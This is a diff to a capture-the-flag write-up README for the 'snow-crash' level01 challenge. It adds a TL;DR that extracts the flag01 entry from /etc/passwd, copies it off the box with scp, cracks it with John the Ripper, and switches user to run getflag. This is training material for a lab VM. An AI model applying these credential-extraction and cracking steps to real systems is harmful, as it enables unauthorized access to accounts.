@@ -8,6 +8,23 @@
 <br>
 
 
+## TL;DR:
+
+To get the `flag01` user password:
+```bash
+echo "$(cat /etc/passwd | grep flag01)" > /tmp/passwd
+scp -P 4242 level00@snow-crash:/tmp/passwd /tmp/
+john --show /tmp/passwd
+```
+
+With the password `abcdefg`:
+```bash
+su flag01 -c getflag
+```
+
+<br>
+
+
 ## Explanation:
 
 
@@ -54,8 +71,16 @@ john --show /tmp/passwd
 > ```
 
 
+#### Step 3:
+
+- Don't forget to get the flag to validate the level:
+```bash
+su flag01 -c getflag
+```
+
+
 <br>
 
 ---
 
-[<<](/level00/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level02/resources/Readme.md)
+[<<](/level00/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level02/resources/Readme.md)
